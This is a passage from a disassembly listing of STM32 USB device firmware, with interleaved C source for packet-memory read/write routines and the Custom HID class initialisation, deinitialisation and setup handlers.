 8008484:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008488:	4770      	bx	lr

0800848a <USB_EP0_OutStart>:
  * @param  USBx Selected device
  * @param  psetup pointer to setup packet
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EP0_OutStart(USB_TypeDef *USBx, uint8_t *psetup)
{
 800848a:	b480      	push	{r7}
 800848c:	b083      	sub	sp, #12
 800848e:	af00      	add	r7, sp, #0
 8008490:	6078      	str	r0, [r7, #4]
 8008492:	6039      	str	r1, [r7, #0]
  UNUSED(psetup);
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 8008494:	2300      	movs	r3, #0
}
 8008496:	4618      	mov	r0, r3
 8008498:	370c      	adds	r7, #12
 800849a:	46bd      	mov	sp, r7
 800849c:	f85d 7b04 	ldr.w	r7, [sp], #4
 80084a0:	4770      	bx	lr

080084a2 <USB_WritePMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_WritePMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 80084a2:	b480      	push	{r7}
 80084a4:	b08b      	sub	sp, #44	; 0x2c
 80084a6:	af00      	add	r7, sp, #0
 80084a8:	60f8      	str	r0, [r7, #12]
 80084aa:	60b9      	str	r1, [r7, #8]
 80084ac:	4611      	mov	r1, r2
 80084ae:	461a      	mov	r2, r3
 80084b0:	460b      	mov	r3, r1
 80084b2:	80fb      	strh	r3, [r7, #6]
 80084b4:	4613      	mov	r3, r2
 80084b6:	80bb      	strh	r3, [r7, #4]
  uint32_t n = ((uint32_t)wNBytes + 1U) >> 1;
 80084b8:	88bb      	ldrh	r3, [r7, #4]
 80084ba:	3301      	adds	r3, #1
 80084bc:	085b      	lsrs	r3, r3, #1
 80084be:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 80084c0:	68fb      	ldr	r3, [r7, #12]
 80084c2:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint16_t WrVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 80084c4:	68bb      	ldr	r3, [r7, #8]
 80084c6:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 80084c8:	88fa      	ldrh	r2, [r7, #6]
 80084ca:	697b      	ldr	r3, [r7, #20]
 80084cc:	4413      	add	r3, r2
 80084ce:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 80084d2:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 80084d4:	69bb      	ldr	r3, [r7, #24]
 80084d6:	627b      	str	r3, [r7, #36]	; 0x24
 80084d8:	e01b      	b.n	8008512 <USB_WritePMA+0x70>
  {
    WrVal = pBuf[0];
 80084da:	69fb      	ldr	r3, [r7, #28]
 80084dc:	781b      	ldrb	r3, [r3, #0]
 80084de:	827b      	strh	r3, [r7, #18]
    WrVal |= (uint16_t)pBuf[1] << 8;
 80084e0:	69fb      	ldr	r3, [r7, #28]
 80084e2:	3301      	adds	r3, #1
 80084e4:	781b      	ldrb	r3, [r3, #0]
 80084e6:	021b      	lsls	r3, r3, #8
 80084e8:	b21a      	sxth	r2, r3
 80084ea:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 80084ee:	4313      	orrs	r3, r2
 80084f0:	b21b      	sxth	r3, r3
 80084f2:	827b      	strh	r3, [r7, #18]
    *pdwVal = (WrVal & 0xFFFFU);
 80084f4:	6a3b      	ldr	r3, [r7, #32]
 80084f6:	8a7a      	ldrh	r2, [r7, #18]
 80084f8:	801a      	strh	r2, [r3, #0]
    pdwVal++;
 80084fa:	6a3b      	ldr	r3, [r7, #32]
 80084fc:	3302      	adds	r3, #2
 80084fe:	623b      	str	r3, [r7, #32]

#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */

    pBuf++;
 8008500:	69fb      	ldr	r3, [r7, #28]
 8008502:	3301      	adds	r3, #1
 8008504:	61fb      	str	r3, [r7, #28]
    pBuf++;
 8008506:	69fb      	ldr	r3, [r7, #28]
 8008508:	3301      	adds	r3, #1
 800850a:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 800850c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800850e:	3b01      	subs	r3, #1
 8008510:	627b      	str	r3, [r7, #36]	; 0x24
 8008512:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008514:	2b00      	cmp	r3, #0
 8008516:	d1e0      	bne.n	80084da <USB_WritePMA+0x38>
  }
}
 8008518:	bf00      	nop
 800851a:	bf00      	nop
 800851c:	372c      	adds	r7, #44	; 0x2c
 800851e:	46bd      	mov	sp, r7
 8008520:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008524:	4770      	bx	lr

08008526 <USB_ReadPMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_ReadPMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 8008526:	b480      	push	{r7}
 8008528:	b08b      	sub	sp, #44	; 0x2c
 800852a:	af00      	add	r7, sp, #0
 800852c:	60f8      	str	r0, [r7, #12]
 800852e:	60b9      	str	r1, [r7, #8]
 8008530:	4611      	mov	r1, r2
 8008532:	461a      	mov	r2, r3
 8008534:	460b      	mov	r3, r1
 8008536:	80fb      	strh	r3, [r7, #6]
 8008538:	4613      	mov	r3, r2
 800853a:	80bb      	strh	r3, [r7, #4]
  uint32_t n = (uint32_t)wNBytes >> 1;
 800853c:	88bb      	ldrh	r3, [r7, #4]
 800853e:	085b      	lsrs	r3, r3, #1
 8008540:	b29b      	uxth	r3, r3
 8008542:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 8008544:	68fb      	ldr	r3, [r7, #12]
 8008546:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint32_t RdVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 8008548:	68bb      	ldr	r3, [r7, #8]
 800854a:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 800854c:	88fa      	ldrh	r2, [r7, #6]
 800854e:	697b      	ldr	r3, [r7, #20]
 8008550:	4413      	add	r3, r2
 8008552:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8008556:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 8008558:	69bb      	ldr	r3, [r7, #24]
 800855a:	627b      	str	r3, [r7, #36]	; 0x24
 800855c:	e018      	b.n	8008590 <USB_ReadPMA+0x6a>
  {
    RdVal = *(__IO uint16_t *)pdwVal;
 800855e:	6a3b      	ldr	r3, [r7, #32]
 8008560:	881b      	ldrh	r3, [r3, #0]
 8008562:	b29b      	uxth	r3, r3
 8008564:	613b      	str	r3, [r7, #16]
    pdwVal++;
 8008566:	6a3b      	ldr	r3, [r7, #32]
 8008568:	3302      	adds	r3, #2
 800856a:	623b      	str	r3, [r7, #32]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 800856c:	693b      	ldr	r3, [r7, #16]
 800856e:	b2da      	uxtb	r2, r3
 8008570:	69fb      	ldr	r3, [r7, #28]
 8008572:	701a      	strb	r2, [r3, #0]
    pBuf++;
 8008574:	69fb      	ldr	r3, [r7, #28]
 8008576:	3301      	adds	r3, #1
 8008578:	61fb      	str	r3, [r7, #28]
    *pBuf = (uint8_t)((RdVal >> 8) & 0xFFU);
 800857a:	693b      	ldr	r3, [r7, #16]
 800857c:	0a1b      	lsrs	r3, r3, #8
 800857e:	b2da      	uxtb	r2, r3
 8008580:	69fb      	ldr	r3, [r7, #28]
 8008582:	701a      	strb	r2, [r3, #0]
    pBuf++;
 8008584:	69fb      	ldr	r3, [r7, #28]
 8008586:	3301      	adds	r3, #1
 8008588:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 800858a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800858c:	3b01      	subs	r3, #1
 800858e:	627b      	str	r3, [r7, #36]	; 0x24
 8008590:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008592:	2b00      	cmp	r3, #0
 8008594:	d1e3      	bne.n	800855e <USB_ReadPMA+0x38>
#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */
  }

  if ((wNBytes % 2U) != 0U)
 8008596:	88bb      	ldrh	r3, [r7, #4]
 8008598:	f003 0301 	and.w	r3, r3, #1
 800859c:	b29b      	uxth	r3, r3
 800859e:	2b00      	cmp	r3, #0
 80085a0:	d007      	beq.n	80085b2 <USB_ReadPMA+0x8c>
  {
    RdVal = *pdwVal;
 80085a2:	6a3b      	ldr	r3, [r7, #32]
 80085a4:	881b      	ldrh	r3, [r3, #0]
 80085a6:	b29b      	uxth	r3, r3
 80085a8:	613b      	str	r3, [r7, #16]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 80085aa:	693b      	ldr	r3, [r7, #16]
 80085ac:	b2da      	uxtb	r2, r3
 80085ae:	69fb      	ldr	r3, [r7, #28]
 80085b0:	701a      	strb	r2, [r3, #0]
  }
}
 80085b2:	bf00      	nop
 80085b4:	372c      	adds	r7, #44	; 0x2c
 80085b6:	46bd      	mov	sp, r7
 80085b8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80085bc:	4770      	bx	lr
	...

080085c0 <USBD_CUSTOM_HID_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 80085c0:	b580      	push	{r7, lr}
 80085c2:	b084      	sub	sp, #16
 80085c4:	af00      	add	r7, sp, #0
 80085c6:	6078      	str	r0, [r7, #4]
 80085c8:	460b      	mov	r3, r1
 80085ca:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)USBD_malloc(sizeof(USBD_CUSTOM_HID_HandleTypeDef));
 80085cc:	2024      	movs	r0, #36	; 0x24
 80085ce:	f004 fd05 	bl	800cfdc <USBD_static_malloc>
 80085d2:	60f8      	str	r0, [r7, #12]

  if (hhid == NULL)
 80085d4:	68fb      	ldr	r3, [r7, #12]
 80085d6:	2b00      	cmp	r3, #0
 80085d8:	d109      	bne.n	80085ee <USBD_CUSTOM_HID_Init+0x2e>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 80085da:	687b      	ldr	r3, [r7, #4]
 80085dc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80085e0:	687b      	ldr	r3, [r7, #4]
 80085e2:	32b0      	adds	r2, #176	; 0xb0
 80085e4:	2100      	movs	r1, #0
 80085e6:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 80085ea:	2302      	movs	r3, #2
 80085ec:	e08b      	b.n	8008706 <USBD_CUSTOM_HID_Init+0x146>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hhid;
 80085ee:	687b      	ldr	r3, [r7, #4]
 80085f0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80085f4:	687b      	ldr	r3, [r7, #4]
 80085f6:	32b0      	adds	r2, #176	; 0xb0
 80085f8:	68f9      	ldr	r1, [r7, #12]
 80085fa:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 80085fe:	687b      	ldr	r3, [r7, #4]
 8008600:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008604:	687b      	ldr	r3, [r7, #4]
 8008606:	32b0      	adds	r2, #176	; 0xb0
 8008608:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 800860c:	687b      	ldr	r3, [r7, #4]
 800860e:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 8008612:	687b      	ldr	r3, [r7, #4]
 8008614:	7c1b      	ldrb	r3, [r3, #16]
 8008616:	2b00      	cmp	r3, #0
 8008618:	d11b      	bne.n	8008652 <USBD_CUSTOM_HID_Init+0x92>
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 800861a:	4b3d      	ldr	r3, [pc, #244]	; (8008710 <USBD_CUSTOM_HID_Init+0x150>)
 800861c:	781b      	ldrb	r3, [r3, #0]
 800861e:	f003 020f 	and.w	r2, r3, #15
 8008622:	6879      	ldr	r1, [r7, #4]
 8008624:	4613      	mov	r3, r2
 8008626:	009b      	lsls	r3, r3, #2
 8008628:	4413      	add	r3, r2
 800862a:	009b      	lsls	r3, r3, #2
 800862c:	440b      	add	r3, r1
 800862e:	3326      	adds	r3, #38	; 0x26
 8008630:	2205      	movs	r2, #5
 8008632:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008634:	4b37      	ldr	r3, [pc, #220]	; (8008714 <USBD_CUSTOM_HID_Init+0x154>)
 8008636:	781b      	ldrb	r3, [r3, #0]
 8008638:	f003 020f 	and.w	r2, r3, #15
 800863c:	6879      	ldr	r1, [r7, #4]
 800863e:	4613      	mov	r3, r2
 8008640:	009b      	lsls	r3, r3, #2
 8008642:	4413      	add	r3, r2
 8008644:	009b      	lsls	r3, r3, #2
 8008646:	440b      	add	r3, r1
 8008648:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 800864c:	2205      	movs	r2, #5
 800864e:	801a      	strh	r2, [r3, #0]
 8008650:	e01a      	b.n	8008688 <USBD_CUSTOM_HID_Init+0xc8>
  }
  else   /* LOW and FULL-speed endpoints */
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008652:	4b2f      	ldr	r3, [pc, #188]	; (8008710 <USBD_CUSTOM_HID_Init+0x150>)
 8008654:	781b      	ldrb	r3, [r3, #0]
 8008656:	f003 020f 	and.w	r2, r3, #15
 800865a:	6879      	ldr	r1, [r7, #4]
 800865c:	4613      	mov	r3, r2
 800865e:	009b      	lsls	r3, r3, #2
 8008660:	4413      	add	r3, r2
 8008662:	009b      	lsls	r3, r3, #2
 8008664:	440b      	add	r3, r1
 8008666:	3326      	adds	r3, #38	; 0x26
 8008668:	2205      	movs	r2, #5
 800866a:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 800866c:	4b29      	ldr	r3, [pc, #164]	; (8008714 <USBD_CUSTOM_HID_Init+0x154>)
 800866e:	781b      	ldrb	r3, [r3, #0]
 8008670:	f003 020f 	and.w	r2, r3, #15
 8008674:	6879      	ldr	r1, [r7, #4]
 8008676:	4613      	mov	r3, r2
 8008678:	009b      	lsls	r3, r3, #2
 800867a:	4413      	add	r3, r2
 800867c:	009b      	lsls	r3, r3, #2
 800867e:	440b      	add	r3, r1
 8008680:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 8008684:	2205      	movs	r2, #5
 8008686:	801a      	strh	r2, [r3, #0]
  }

  /* Open EP IN */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDInEpAdd, USBD_EP_TYPE_INTR,
 8008688:	4b21      	ldr	r3, [pc, #132]	; (8008710 <USBD_CUSTOM_HID_Init+0x150>)
 800868a:	7819      	ldrb	r1, [r3, #0]
 800868c:	2302      	movs	r3, #2
 800868e:	2203      	movs	r2, #3
 8008690:	6878      	ldr	r0, [r7, #4]
 8008692:	f004 fa6f 	bl	800cb74 <USBD_LL_OpenEP>
                       CUSTOM_HID_EPIN_SIZE);

  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 1U;
 8008696:	4b1e      	ldr	r3, [pc, #120]	; (8008710 <USBD_CUSTOM_HID_Init+0x150>)
 8008698:	781b      	ldrb	r3, [r3, #0]
 800869a:	f003 020f 	and.w	r2, r3, #15
 800869e:	6879      	ldr	r1, [r7, #4]
 80086a0:	4613      	mov	r3, r2
 80086a2:	009b      	lsls	r3, r3, #2
 80086a4:	4413      	add	r3, r2
 80086a6:	009b      	lsls	r3, r3, #2
 80086a8:	440b      	add	r3, r1
 80086aa:	3324      	adds	r3, #36	; 0x24
 80086ac:	2201      	movs	r2, #1
 80086ae:	801a      	strh	r2, [r3, #0]

  /* Open EP OUT */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDOutEpAdd, USBD_EP_TYPE_INTR,
 80086b0:	4b18      	ldr	r3, [pc, #96]	; (8008714 <USBD_CUSTOM_HID_Init+0x154>)
 80086b2:	7819      	ldrb	r1, [r3, #0]
 80086b4:	2302      	movs	r3, #2
 80086b6:	2203      	movs	r2, #3
 80086b8:	6878      	ldr	r0, [r7, #4]
 80086ba:	f004 fa5b 	bl	800cb74 <USBD_LL_OpenEP>
                       CUSTOM_HID_EPOUT_SIZE);

  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 1U;
 80086be:	4b15      	ldr	r3, [pc, #84]	; (8008714 <USBD_CUSTOM_HID_Init+0x154>)
 80086c0:	781b      	ldrb	r3, [r3, #0]
 80086c2:	f003 020f 	and.w	r2, r3, #15
 80086c6:	6879      	ldr	r1, [r7, #4]
 80086c8:	4613      	mov	r3, r2
 80086ca:	009b      	lsls	r3, r3, #2
 80086cc:	4413      	add	r3, r2
 80086ce:	009b      	lsls	r3, r3, #2
 80086d0:	440b      	add	r3, r1
 80086d2:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 80086d6:	2201      	movs	r2, #1
 80086d8:	801a      	strh	r2, [r3, #0]

  hhid->state = CUSTOM_HID_IDLE;
 80086da:	68fb      	ldr	r3, [r7, #12]
 80086dc:	2200      	movs	r2, #0
 80086de:	f883 2020 	strb.w	r2, [r3, #32]

  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->Init();
 80086e2:	687b      	ldr	r3, [r7, #4]
 80086e4:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80086e8:	687a      	ldr	r2, [r7, #4]
 80086ea:	33b0      	adds	r3, #176	; 0xb0
 80086ec:	009b      	lsls	r3, r3, #2
 80086ee:	4413      	add	r3, r2
 80086f0:	685b      	ldr	r3, [r3, #4]
 80086f2:	685b      	ldr	r3, [r3, #4]
 80086f4:	4798      	blx	r3

#ifndef USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED
  /* Prepare Out endpoint to receive 1st packet */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 80086f6:	4b07      	ldr	r3, [pc, #28]	; (8008714 <USBD_CUSTOM_HID_Init+0x154>)
 80086f8:	7819      	ldrb	r1, [r3, #0]
 80086fa:	68fa      	ldr	r2, [r7, #12]
 80086fc:	230f      	movs	r3, #15
 80086fe:	6878      	ldr	r0, [r7, #4]
 8008700:	f004 fbea 	bl	800ced8 <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
#endif /* USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED */

  return (uint8_t)USBD_OK;
 8008704:	2300      	movs	r3, #0
}
 8008706:	4618      	mov	r0, r3
 8008708:	3710      	adds	r7, #16
 800870a:	46bd      	mov	sp, r7
 800870c:	bd80      	pop	{r7, pc}
 800870e:	bf00      	nop
 8008710:	200000a6 	.word	0x200000a6
 8008714:	200000a7 	.word	0x200000a7

08008718 <USBD_CUSTOM_HID_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008718:	b580      	push	{r7, lr}
 800871a:	b082      	sub	sp, #8
 800871c:	af00      	add	r7, sp, #0
 800871e:	6078      	str	r0, [r7, #4]
 8008720:	460b      	mov	r3, r1
 8008722:	70fb      	strb	r3, [r7, #3]
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close CUSTOM_HID EP IN */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDInEpAdd);
 8008724:	4b37      	ldr	r3, [pc, #220]	; (8008804 <USBD_CUSTOM_HID_DeInit+0xec>)
 8008726:	781b      	ldrb	r3, [r3, #0]
 8008728:	4619      	mov	r1, r3
 800872a:	6878      	ldr	r0, [r7, #4]
 800872c:	f004 fa60 	bl	800cbf0 <USBD_LL_CloseEP>
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 0U;
 8008730:	4b34      	ldr	r3, [pc, #208]	; (8008804 <USBD_CUSTOM_HID_DeInit+0xec>)
 8008732:	781b      	ldrb	r3, [r3, #0]
 8008734:	f003 020f 	and.w	r2, r3, #15
 8008738:	6879      	ldr	r1, [r7, #4]
 800873a:	4613      	mov	r3, r2
 800873c:	009b      	lsls	r3, r3, #2
 800873e:	4413      	add	r3, r2
 8008740:	009b      	lsls	r3, r3, #2
 8008742:	440b      	add	r3, r1
 8008744:	3324      	adds	r3, #36	; 0x24
 8008746:	2200      	movs	r2, #0
 8008748:	801a      	strh	r2, [r3, #0]
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = 0U;
 800874a:	4b2e      	ldr	r3, [pc, #184]	; (8008804 <USBD_CUSTOM_HID_DeInit+0xec>)
 800874c:	781b      	ldrb	r3, [r3, #0]
 800874e:	f003 020f 	and.w	r2, r3, #15
 8008752:	6879      	ldr	r1, [r7, #4]
 8008754:	4613      	mov	r3, r2
 8008756:	009b      	lsls	r3, r3, #2
 8008758:	4413      	add	r3, r2
 800875a:	009b      	lsls	r3, r3, #2
 800875c:	440b      	add	r3, r1
 800875e:	3326      	adds	r3, #38	; 0x26
 8008760:	2200      	movs	r2, #0
 8008762:	801a      	strh	r2, [r3, #0]

  /* Close CUSTOM_HID EP OUT */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDOutEpAdd);
 8008764:	4b28      	ldr	r3, [pc, #160]	; (8008808 <USBD_CUSTOM_HID_DeInit+0xf0>)
 8008766:	781b      	ldrb	r3, [r3, #0]
 8008768:	4619      	mov	r1, r3
 800876a:	6878      	ldr	r0, [r7, #4]
 800876c:	f004 fa40 	bl	800cbf0 <USBD_LL_CloseEP>
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 0U;
 8008770:	4b25      	ldr	r3, [pc, #148]	; (8008808 <USBD_CUSTOM_HID_DeInit+0xf0>)
 8008772:	781b      	ldrb	r3, [r3, #0]
 8008774:	f003 020f 	and.w	r2, r3, #15
 8008778:	6879      	ldr	r1, [r7, #4]
 800877a:	4613      	mov	r3, r2
 800877c:	009b      	lsls	r3, r3, #2
 800877e:	4413      	add	r3, r2
 8008780:	009b      	lsls	r3, r3, #2
 8008782:	440b      	add	r3, r1
 8008784:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008788:	2200      	movs	r2, #0
 800878a:	801a      	strh	r2, [r3, #0]
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = 0U;
 800878c:	4b1e      	ldr	r3, [pc, #120]	; (8008808 <USBD_CUSTOM_HID_DeInit+0xf0>)
 800878e:	781b      	ldrb	r3, [r3, #0]
 8008790:	f003 020f 	and.w	r2, r3, #15
 8008794:	6879      	ldr	r1, [r7, #4]
 8008796:	4613      	mov	r3, r2
 8008798:	009b      	lsls	r3, r3, #2
 800879a:	4413      	add	r3, r2
 800879c:	009b      	lsls	r3, r3, #2
 800879e:	440b      	add	r3, r1
 80087a0:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 80087a4:	2200      	movs	r2, #0
 80087a6:	801a      	strh	r2, [r3, #0]

  /* Free allocated memory */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 80087a8:	687b      	ldr	r3, [r7, #4]
 80087aa:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80087ae:	687b      	ldr	r3, [r7, #4]
 80087b0:	32b0      	adds	r2, #176	; 0xb0
 80087b2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80087b6:	2b00      	cmp	r3, #0
 80087b8:	d01f      	beq.n	80087fa <USBD_CUSTOM_HID_DeInit+0xe2>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->DeInit();
 80087ba:	687b      	ldr	r3, [r7, #4]
 80087bc:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80087c0:	687a      	ldr	r2, [r7, #4]
 80087c2:	33b0      	adds	r3, #176	; 0xb0
 80087c4:	009b      	lsls	r3, r3, #2
 80087c6:	4413      	add	r3, r2
 80087c8:	685b      	ldr	r3, [r3, #4]
 80087ca:	689b      	ldr	r3, [r3, #8]
 80087cc:	4798      	blx	r3
    USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 80087ce:	687b      	ldr	r3, [r7, #4]
 80087d0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80087d4:	687b      	ldr	r3, [r7, #4]
 80087d6:	32b0      	adds	r2, #176	; 0xb0
 80087d8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80087dc:	4618      	mov	r0, r3
 80087de:	f004 fc19 	bl	800d014 <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 80087e2:	687b      	ldr	r3, [r7, #4]
 80087e4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80087e8:	687b      	ldr	r3, [r7, #4]
 80087ea:	32b0      	adds	r2, #176	; 0xb0
 80087ec:	2100      	movs	r1, #0
 80087ee:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 80087f2:	687b      	ldr	r3, [r7, #4]
 80087f4:	2200      	movs	r2, #0
 80087f6:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 80087fa:	2300      	movs	r3, #0
}
 80087fc:	4618      	mov	r0, r3
 80087fe:	3708      	adds	r7, #8
 8008800:	46bd      	mov	sp, r7
 8008802:	bd80      	pop	{r7, pc}
 8008804:	200000a6 	.word	0x200000a6
 8008808:	200000a7 	.word	0x200000a7

0800880c <USBD_CUSTOM_HID_Setup>:
  * @param  req: usb requests
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Setup(USBD_HandleTypeDef *pdev,
                                     USBD_SetupReqTypedef *req)
{
 800880c:	b580      	push	{r7, lr}
 800880e:	b088      	sub	sp, #32
 8008810:	af00      	add	r7, sp, #0
 8008812:	6078      	str	r0, [r7, #4]
 8008814:	6039      	str	r1, [r7, #0]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008816:	687b      	ldr	r3, [r7, #4]
 8008818:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800881c:	687b      	ldr	r3, [r7, #4]
 800881e:	32b0      	adds	r2, #176	; 0xb0
 8008820:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008824:	613b      	str	r3, [r7, #16]
  uint16_t len = 0U;
 8008826:	2300      	movs	r3, #0
 8008828:	83fb      	strh	r3, [r7, #30]
#ifdef USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED
  uint16_t ReportLength = 0U;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */
  uint8_t  *pbuf = NULL;
 800882a:	2300      	movs	r3, #0
 800882c:	61bb      	str	r3, [r7, #24]
  uint16_t status_info = 0U;
 800882e:	2300      	movs	r3, #0
 8008830:	81fb      	strh	r3, [r7, #14]
  USBD_StatusTypeDef ret = USBD_OK;
 8008832:	2300      	movs	r3, #0
 8008834:	75fb      	strb	r3, [r7, #23]

  if (hhid == NULL)
 8008836:	693b      	ldr	r3, [r7, #16]
 8008838:	2b00      	cmp	r3, #0
 800883a:	d101      	bne.n	8008840 <USBD_CUSTOM_HID_Setup+0x34>
  {
    return (uint8_t)USBD_FAIL;
 800883c:	2303      	movs	r3, #3
 800883e:	e0f8      	b.n	8008a32 <USBD_CUSTOM_HID_Setup+0x226>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 8008840:	683b      	ldr	r3, [r7, #0]
 8008842:	781b      	ldrb	r3, [r3, #0]
 8008844:	f003 0360 	and.w	r3, r3, #96	; 0x60
 8008848:	2b00      	cmp	r3, #0
